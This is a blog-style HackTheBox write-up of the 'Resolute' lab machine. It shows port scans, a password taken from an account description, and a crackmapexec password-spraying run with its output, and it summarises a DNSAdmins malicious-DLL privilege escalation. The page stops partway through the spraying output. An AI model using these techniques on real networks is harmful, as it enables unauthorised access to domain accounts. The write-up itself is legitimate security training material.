@@ -1,0 +1,561 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <meta http-equiv="content-type" content="text/html;charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noodp"/>
+  
+  
+  
+  
+  
+  <link rel="prev" href="https://eriqueangwenyi.github.io/2020/blackfield/" />
+  
+  <link rel="canonical" href="https://eriqueangwenyi.github.io/2020/resolute/" />
+  <link rel='shortcut icon' type='image/x-icon' href='/favicon.ico' />
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+  <link rel="manifest" href="/site.webmanifest">
+  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="theme-color" content="#ffffff">
+  <title>
+       
+       
+           Resolute Exploitation HackTheBox | Astrah
+       
+  </title>
+  <meta name="title" content="Resolute Exploitation HackTheBox | Astrah">
+    
+  
+  <link rel="stylesheet" href="/font/iconfont.css">
+  <link rel="stylesheet" href="/css/main.min.css">
+
+
+  <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Resolute Exploitation HackTheBox"/>
+<meta name="twitter:description" content="Resolute Summary
+ Running enum4linux gave usernames . Got password for a user marko but turned out to be melanie&rsquo;s. Logged in as melanie using evil-winrm Got user.txt flag Manual enumeration into directories and got some hidden files Got password for user ryan from a file. Switched to ryan User is in the group of dnsadmin Crafting malicious dll file for dll-injection Starting the smb server using impacket smbserver.py Setting up the path for /serverlevelplugindll to my dll Stoping and starting the service dns Got root."/>
+
+  <script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Resolute Exploitation HackTheBox",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https:\/\/eriqueangwenyi.github.io\/2020\/resolute\/"
+  },
+  "image": {
+    "@type": "ImageObject",
+    "url": "https:\/\/eriqueangwenyi.github.io\/cover.png",
+    "width":  800 ,
+    "height":  600 
+  },
+  "genre": "posts",
+  "keywords": "Windows, AD, HackTheBox, Active Directory",
+  "wordcount":  1358 ,
+  "url": "https:\/\/eriqueangwenyi.github.io\/2020\/resolute\/",
+  "datePublished": "2020-12-23T00:00:00\u002b00:00",
+  "dateModified": "2020-12-23T00:00:00\u002b00:00",
+  
+  "publisher": {
+    "@type": "Organization",
+    "name": "Fastbyte01",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https:\/\/eriqueangwenyi.github.io\/logo.png",
+      "width":  127 ,
+      "height":  40 
+    }
+  },
+  "author": {
+    "@type": "Person",
+    "name": "map[name:Astrah]"
+  },
+  "description": ""
+}
+</script>
+</head>
+
+  
+
+
+
+  <body class="">
+    <div class="wrapper">
+        <nav class="navbar">
+    <div class="container">
+        <div class="navbar-header header-logo">
+        	<a href="https://eriqueangwenyi.github.io">Astrah</a>
+        </div>
+        <div class="menu navbar-right">
+                
+                
+                <a class="menu-item" href="/posts/" title="">Blog</a>
+                
+                <a class="menu-item" href="/categories/" title="">Categories</a>
+                
+                <a class="menu-item" href="/about" title="">About</a>
+                
+                <a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-sun"></i></a>&nbsp;
+        </div>
+    </div>
+</nav>
+<nav class="navbar-mobile" id="nav-mobile" style="display: none">
+     <div class="container">
+        <div class="navbar-header">
+            <div>  <a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-sun"></i></a>&nbsp;<a href="https://eriqueangwenyi.github.io">Astrah</a></div>
+            <div class="menu-toggle">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+     
+          <div class="menu" id="mobile-menu">
+                
+                
+                <a class="menu-item" href="/posts/" title="">Blog</a>
+                
+                <a class="menu-item" href="/categories/" title="">Categories</a>
+                
+                <a class="menu-item" href="/about" title="">About</a>
+                
+        </div>
+    </div>
+</nav>
+
+    	 <main class="main">
+          <div class="container">
+      		
+<article class="post-warp">
+    <header class="post-header">
+        <h1 class="post-title">Resolute Exploitation HackTheBox</h1>
+        <div class="post-meta">
+            Written by <a href="https://eriqueangwenyi.github.io" rel="author">map[name:Astrah]</a> with ♥ 
+                <span class="post-time">
+                    on <time datetime=2020-12-23 >23 December 2020</time>
+                </span>
+                in
+                <i class="iconfont icon-folder"></i>
+                <span class="post-category">
+                        <a href="https://eriqueangwenyi.github.io/categories/windows/"> Windows </a>
+                        
+                </span>
+                <i class="iconfont icon-timer"></i>
+                7 min
+        </div>
+    </header>
+    <div class="post-content">
+        
+
+        
+            
+        
+
+        
+        
+     
+          
+          
+          
+
+          
+          
+          
+
+          <h1 id="resolute">Resolute</h1>
+<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/resolute.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure>
+<strong>Summary</strong></p>
+<ul>
+<li>Running enum4linux gave usernames .</li>
+<li>Got password for a user marko but turned out to be melanie&rsquo;s.</li>
+<li>Logged in as melanie using evil-winrm</li>
+<li>Got user.txt flag</li>
+<li>Manual enumeration into directories and got some hidden files</li>
+<li>Got password for user ryan from a file.</li>
+<li>Switched to ryan</li>
+<li>User is in the group of dnsadmin</li>
+<li>Crafting malicious dll file for dll-injection</li>
+<li>Starting the smb server using impacket smbserver.py</li>
+<li>Setting up the path for /serverlevelplugindll to my dll</li>
+<li>Stoping and starting the service dns</li>
+<li>Got root.txt</li>
+</ul>
+<p><strong>masscan results</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#960050;background-color:#1e0010">❯</span> sudo masscan <span style="color:#f92672">--</span>rate<span style="color:#f92672">=</span><span style="color:#ae81ff">1000</span> <span style="color:#f92672">-</span>e tun0 <span style="color:#f92672">-</span>p0<span style="color:#f92672">-</span><span style="color:#ae81ff">65535</span> <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">169</span>
+<span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> <span style="color:#e6db74">astrah</span>: 
+
+<span style="color:#66d9ef">Starting</span> masscan <span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">0</span><span style="color:#f92672">.</span><span style="color:#ae81ff">5</span> (<span style="color:#e6db74">http</span>:<span style="color:#e6db74">//</span>bit<span style="color:#f92672">.</span>ly<span style="color:#f92672">/</span><span style="color:#ae81ff">14</span><span style="color:#66d9ef">GZzcT</span>) at <span style="color:#ae81ff">2020</span><span style="color:#f92672">-</span><span style="color:#ae81ff">12</span><span style="color:#f92672">-</span><span style="color:#ae81ff">22</span> <span style="color:#ae81ff">18</span>:<span style="color:#ae81ff">42</span>:<span style="color:#ae81ff">03</span> <span style="color:#66d9ef">GMT</span>
+ <span style="color:#f92672">--</span> forced <span style="color:#e6db74">options</span>: <span style="color:#f92672">-</span>sS <span style="color:#f92672">-</span><span style="color:#66d9ef">Pn</span> <span style="color:#f92672">-</span>n <span style="color:#f92672">--</span>randomize<span style="color:#f92672">-</span>hosts <span style="color:#f92672">-</span>v <span style="color:#f92672">--</span>send<span style="color:#f92672">-</span>eth
+<span style="color:#66d9ef">Initiating</span> <span style="color:#66d9ef">SYN</span> <span style="color:#66d9ef">Stealth</span> <span style="color:#66d9ef">Scan</span>
+<span style="color:#66d9ef">Scanning</span> <span style="color:#ae81ff">1</span> hosts <span style="color:#f92672">[</span><span style="color:#ae81ff">65536</span> ports<span style="color:#f92672">/</span>host<span style="color:#f92672">]</span>
+<span style="color:#66d9ef">Discovered</span> open port <span style="color:#ae81ff">49666</span><span style="color:#f92672">/</span>tcp on <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">169</span>                                 
+<span style="color:#66d9ef">Discovered</span> open port <span style="color:#ae81ff">49664</span><span style="color:#f92672">/</span>tcp on <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">169</span>                                 
+<span style="color:#66d9ef">Discovered</span> open port <span style="color:#ae81ff">636</span><span style="color:#f92672">/</span>tcp on <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">169</span>                                   
+<span style="color:#66d9ef">Discovered</span> open port <span style="color:#ae81ff">49665</span><span style="color:#f92672">/</span>tcp on <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">169</span>                                 
+<span style="color:#66d9ef">Discovered</span> open port <span style="color:#ae81ff">49688</span><span style="color:#f92672">/</span>tcp on <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">169</span>                                 
+<span style="color:#66d9ef">Discovered</span> open port <span style="color:#ae81ff">49776</span><span style="color:#f92672">/</span>tcp on <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">169</span>                                 
+<span style="color:#66d9ef">Discovered</span> open port <span style="color:#ae81ff">593</span><span style="color:#f92672">/</span>tcp on <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">169</span>                                   
+<span style="color:#66d9ef">Discovered</span> open port <span style="color:#ae81ff">464</span><span style="color:#f92672">/</span>tcp on <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">169</span>                                   
+<span style="color:#66d9ef">Discovered</span> open port <span style="color:#ae81ff">49667</span><span style="color:#f92672">/</span>tcp on <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">169</span>                                 
+<span style="color:#66d9ef">Discovered</span> open port <span style="color:#ae81ff">53</span><span style="color:#f92672">/</span>tcp on <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">169</span>                                    
+<span style="color:#66d9ef">Discovered</span> open port <span style="color:#ae81ff">5985</span><span style="color:#f92672">/</span>tcp on <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">169</span>                                  
+<span style="color:#66d9ef">Discovered</span> open port <span style="color:#ae81ff">9389</span><span style="color:#f92672">/</span>tcp on <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">169</span>                                  
+<span style="color:#66d9ef">Discovered</span> open port <span style="color:#ae81ff">3268</span><span style="color:#f92672">/</span>tcp on <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">169</span>                                  
+<span style="color:#66d9ef">Discovered</span> open port <span style="color:#ae81ff">49677</span><span style="color:#f92672">/</span>tcp on <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">169</span>                                 
+<span style="color:#66d9ef">Discovered</span> open port <span style="color:#ae81ff">88</span><span style="color:#f92672">/</span>tcp on <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">169</span>                                    
+<span style="color:#66d9ef">Discovered</span> open port <span style="color:#ae81ff">445</span><span style="color:#f92672">/</span>tcp on <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">169</span>                                   
+<span style="color:#66d9ef">Discovered</span> open port <span style="color:#ae81ff">139</span><span style="color:#f92672">/</span>tcp on <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">169</span>                                   
+<span style="color:#66d9ef">Discovered</span> open port <span style="color:#ae81ff">49671</span><span style="color:#f92672">/</span>tcp on <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">169</span>                                 
+<span style="color:#66d9ef">Discovered</span> open port <span style="color:#ae81ff">389</span><span style="color:#f92672">/</span>tcp on <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">169</span>                                   
+<span style="color:#66d9ef">Discovered</span> open port <span style="color:#ae81ff">135</span><span style="color:#f92672">/</span>tcp on <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">169</span>                                   
+<span style="color:#66d9ef">Discovered</span> open port <span style="color:#ae81ff">3269</span><span style="color:#f92672">/</span>tcp on <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">169</span>                                  
+<span style="color:#66d9ef">Discovered</span> open port <span style="color:#ae81ff">49819</span><span style="color:#f92672">/</span>tcp on <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">169</span>                                 
+<span style="color:#66d9ef">Discovered</span> open port <span style="color:#ae81ff">49676</span><span style="color:#f92672">/</span>tcp on <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">169</span>                                 
+<span style="color:#66d9ef">Discovered</span> open port <span style="color:#ae81ff">47001</span><span style="color:#f92672">/</span>tcp on <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">169</span>
+</code></pre></div><p><strong>nmap for more info</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#960050;background-color:#1e0010">❯</span> sudo nmap <span style="color:#f92672">-</span>sV <span style="color:#f92672">-</span>sC <span style="color:#f92672">-</span><span style="color:#66d9ef">Pn</span> <span style="color:#f92672">-</span>oN nmap <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">169</span>
+<span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> <span style="color:#e6db74">astrah</span>: 
+<span style="color:#66d9ef">Starting</span> <span style="color:#66d9ef">Nmap</span> <span style="color:#ae81ff">7</span><span style="color:#f92672">.</span><span style="color:#ae81ff">80</span> ( <span style="color:#e6db74">https</span>:<span style="color:#e6db74">//nm</span>ap<span style="color:#f92672">.</span>org ) at <span style="color:#ae81ff">2020</span><span style="color:#f92672">-</span><span style="color:#ae81ff">12</span><span style="color:#f92672">-</span><span style="color:#ae81ff">22</span> <span style="color:#ae81ff">13</span>:<span style="color:#ae81ff">44</span> <span style="color:#66d9ef">EST</span>
+<span style="color:#66d9ef">Nmap</span> scan report <span style="color:#66d9ef">for</span> resolute<span style="color:#f92672">.</span>htb (<span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">169</span>)
+<span style="color:#66d9ef">Host</span> is up (<span style="color:#ae81ff">0</span><span style="color:#f92672">.</span><span style="color:#ae81ff">29</span>s latency)<span style="color:#f92672">.</span>
+<span style="color:#66d9ef">Not</span> <span style="color:#e6db74">shown</span>: <span style="color:#ae81ff">989</span> closed ports
+<span style="color:#66d9ef">PORT</span>     <span style="color:#66d9ef">STATE</span> <span style="color:#66d9ef">SERVICE</span>      <span style="color:#66d9ef">VERSION</span>
+<span style="color:#ae81ff">53</span><span style="color:#f92672">/</span>tcp   open  domain?
+<span style="color:#f92672">|</span> fingerprint<span style="color:#f92672">-</span><span style="color:#e6db74">strings</span>: 
+<span style="color:#f92672">|</span>   <span style="color:#e6db74">DNSVersionBindReqTCP</span>: 
+<span style="color:#f92672">|</span>     version
+<span style="color:#f92672">|</span>_    bind
+<span style="color:#ae81ff">88</span><span style="color:#f92672">/</span>tcp   open  kerberos<span style="color:#f92672">-</span>sec <span style="color:#66d9ef">Microsoft</span> <span style="color:#66d9ef">Windows</span> <span style="color:#66d9ef">Kerberos</span> (server <span style="color:#e6db74">time</span>: <span style="color:#ae81ff">2020</span><span style="color:#f92672">-</span><span style="color:#ae81ff">12</span><span style="color:#f92672">-</span><span style="color:#ae81ff">22</span> <span style="color:#ae81ff">18</span>:<span style="color:#ae81ff">55</span>:<span style="color:#ae81ff">49</span>Z)
+<span style="color:#ae81ff">135</span><span style="color:#f92672">/</span>tcp  open  msrpc        <span style="color:#66d9ef">Microsoft</span> <span style="color:#66d9ef">Windows</span> <span style="color:#66d9ef">RPC</span>
+<span style="color:#ae81ff">139</span><span style="color:#f92672">/</span>tcp  open  netbios<span style="color:#f92672">-</span>ssn  <span style="color:#66d9ef">Microsoft</span> <span style="color:#66d9ef">Windows</span> netbios<span style="color:#f92672">-</span>ssn
+<span style="color:#ae81ff">389</span><span style="color:#f92672">/</span>tcp  open  ldap         <span style="color:#66d9ef">Microsoft</span> <span style="color:#66d9ef">Windows</span> <span style="color:#66d9ef">Active</span> <span style="color:#66d9ef">Directory</span> <span style="color:#66d9ef">LDAP</span> (<span style="color:#e6db74">Domain</span>: megabank<span style="color:#f92672">.</span>local, <span style="color:#e6db74">Site</span>: <span style="color:#66d9ef">Default</span><span style="color:#f92672">-</span><span style="color:#66d9ef">First</span><span style="color:#f92672">-</span><span style="color:#66d9ef">Site</span><span style="color:#f92672">-</span><span style="color:#66d9ef">Name</span>)
+<span style="color:#ae81ff">445</span><span style="color:#f92672">/</span>tcp  open  microsoft<span style="color:#f92672">-</span>ds <span style="color:#66d9ef">Windows</span> <span style="color:#66d9ef">Server</span> <span style="color:#ae81ff">2016</span> <span style="color:#66d9ef">Standard</span> <span style="color:#ae81ff">14393</span> microsoft<span style="color:#f92672">-</span>ds (<span style="color:#e6db74">workgroup</span>: <span style="color:#66d9ef">MEGABANK</span>)
+<span style="color:#ae81ff">464</span><span style="color:#f92672">/</span>tcp  open  kpasswd5?
+<span style="color:#ae81ff">593</span><span style="color:#f92672">/</span>tcp  open  ncacn_http   <span style="color:#66d9ef">Microsoft</span> <span style="color:#66d9ef">Windows</span> <span style="color:#66d9ef">RPC</span> over <span style="color:#66d9ef">HTTP</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">0</span>
+<span style="color:#ae81ff">636</span><span style="color:#f92672">/</span>tcp  open  tcpwrapped
+<span style="color:#ae81ff">3268</span><span style="color:#f92672">/</span>tcp open  ldap         <span style="color:#66d9ef">Microsoft</span> <span style="color:#66d9ef">Windows</span> <span style="color:#66d9ef">Active</span> <span style="color:#66d9ef">Directory</span> <span style="color:#66d9ef">LDAP</span> (<span style="color:#e6db74">Domain</span>: megabank<span style="color:#f92672">.</span>local, <span style="color:#e6db74">Site</span>: <span style="color:#66d9ef">Default</span><span style="color:#f92672">-</span><span style="color:#66d9ef">First</span><span style="color:#f92672">-</span><span style="color:#66d9ef">Site</span><span style="color:#f92672">-</span><span style="color:#66d9ef">Name</span>)
+<span style="color:#ae81ff">3269</span><span style="color:#f92672">/</span>tcp open  tcpwrapped
+</code></pre></div><p>Smb was enumerated first using <strong>enum4linux</strong>.
+The following users were found and saved them into user.txt
+<figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/enum4linux.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
+<p>Going through the enum4linux results i also found a password</p>
+<p><code>index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko	Name: Marko Novak	Desc: Account created. Password set to Welcome123!</code></p>
+<p>using crackmapexec bruteforcing was done on smb using the collected users and the password</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#960050;background-color:#1e0010">❯</span> crackmapexec smb <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">169</span> <span style="color:#f92672">-</span>u user<span style="color:#f92672">.</span>txt <span style="color:#f92672">-</span>p <span style="color:#66d9ef">Welcome123</span><span style="color:#f92672">!</span>
+<span style="color:#66d9ef">SMB</span>         <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">169</span>    <span style="color:#ae81ff">445</span>    <span style="color:#66d9ef">RESOLUTE</span>         <span style="color:#f92672">[*]</span> <span style="color:#66d9ef">Windows</span> <span style="color:#66d9ef">Server</span> <span style="color:#ae81ff">2016</span> <span style="color:#66d9ef">Standard</span> <span style="color:#ae81ff">14393</span> x64 (name<span style="color:#e6db74">:RESOLUTE</span>) (<span style="color:#e6db74">domain</span>:<span style="color:#66d9ef">MEGABANK</span>) (<span style="color:#e6db74">signing</span>:<span style="color:#66d9ef">True</span>) (<span style="color:#e6db74">SMBv1</span>:<span style="color:#66d9ef">True</span>)
+<span style="color:#66d9ef">SMB</span>         <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">169</span>    <span style="color:#ae81ff">445</span>    <span style="color:#66d9ef">RESOLUTE</span>         <span style="color:#f92672">[-]</span> <span style="color:#66d9ef">MEGABANK</span>\<span style="color:#e6db74">Administrator</span>:<span style="color:#66d9ef">Welcome123</span><span style="color:#f92672">!</span> <span style="color:#66d9ef">STATUS_LOGON_FAILURE</span> 
+<span style="color:#66d9ef">SMB</span>         <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">169</span>    <span style="color:#ae81ff">445</span>    <span style="color:#66d9ef">RESOLUTE</span>         <span style="color:#f92672">[-]</span> <span style="color:#66d9ef">MEGABANK</span>\<span style="color:#e6db74">Guest</span>:<span style="color:#66d9ef">Welcome123</span><span style="color:#f92672">!</span> <span style="color:#66d9ef">STATUS_LOGON_FAILURE</span> 
+<span style="color:#66d9ef">SMB</span>         <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">169</span>    <span style="color:#ae81ff">445</span>    <span style="color:#66d9ef">RESOLUTE</span>         <span style="color:#f92672">[-]</span> <span style="color:#66d9ef">MEGABANK</span>\<span style="color:#e6db74">krbtgt</span>:<span style="color:#66d9ef">Welcome123</span><span style="color:#f92672">!</span> <span style="color:#66d9ef">STATUS_LOGON_FAILURE</span> 
+<span style="color:#66d9ef">SMB</span>         <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">169</span>    <span style="color:#ae81ff">445</span>    <span style="color:#66d9ef">RESOLUTE</span>         <span style="color:#f92672">[-]</span> <span style="color:#66d9ef">MEGABANK</span>\<span style="color:#e6db74">DefaultAccount</span>:<span style="color:#66d9ef">Welcome123</span><span style="color:#f92672">!</span> <span style="color:#66d9ef">STATUS_LOGON_FAILURE</span> 
+<span style="color:#66d9ef">SMB</span>         <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">169</span>    <span style="color:#ae81ff">445</span>    <span style="color:#66d9ef">RESOLUTE</span>         <span style="color:#f92672">[-]</span> <span style="color:#66d9ef">MEGABANK</span>\<span style="color:#e6db74">ryan</span>:<span style="color:#66d9ef">Welcome123</span><span style="color:#f92672">!</span> <span style="color:#66d9ef">STATUS_LOGON_FAILURE</span> 
+<span style="color:#66d9ef">SMB</span>         <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">169</span>    <span style="color:#ae81ff">445</span>    <span style="color:#66d9ef">RESOLUTE</span>         <span style="color:#f92672">[-]</span> <span style="color:#66d9ef">MEGABANK</span>\<span style="color:#e6db74">marko</span>:<span style="color:#66d9ef">Welcome123</span><span style="color:#f92672">!</span> <span style="color:#66d9ef">STATUS_LOGON_FAILURE</span> 
+<span style="color:#66d9ef">SMB</span>         <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">169</span>    <span style="color:#ae81ff">445</span>    <span style="color:#66d9ef">RESOLUTE</span>         <span style="color:#f92672">[-]</span> <span style="color:#66d9ef">MEGABANK</span>\<span style="color:#e6db74">sunita</span>:<span style="color:#66d9ef">Welcome123</span><span style="color:#f92672">!</span> <span style="color:#66d9ef">STATUS_LOGON_FAILURE</span> 
+<span style="color:#66d9ef">SMB</span>         <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">169</span>    <span style="color:#ae81ff">445</span>    <span style="color:#66d9ef">RESOLUTE</span>         <span style="color:#f92672">[-]</span> <span style="color:#66d9ef">MEGABANK</span>\<span style="color:#e6db74">abigail</span>:<span style="color:#66d9ef">Welcome123</span><span style="color:#f92672">!</span> <span style="color:#66d9ef">STATUS_LOGON_FAILURE</span> 
+<span style="color:#66d9ef">SMB</span>         <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">169</span>    <span style="color:#ae81ff">445</span>    <span style="color:#66d9ef">RESOLUTE</span>         <span style="color:#f92672">[-]</span> <span style="color:#66d9ef">MEGABANK</span>\<span style="color:#e6db74">marcus</span>:<span style="color:#66d9ef">Welcome123</span><span style="color:#f92672">!</span> <span style="color:#66d9ef">STATUS_LOGON_FAILURE</span> 
+<span style="color:#66d9ef">SMB</span>         <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">169</span>    <span style="color:#ae81ff">445</span>    <span style="color:#66d9ef">RESOLUTE</span>         <span style="color:#f92672">[-]</span> <span style="color:#66d9ef">MEGABANK</span>\<span style="color:#e6db74">sally</span>:<span style="color:#66d9ef">Welcome123</span><span style="color:#f92672">!</span> <span style="color:#66d9ef">STATUS_LOGON_FAILURE</span> 
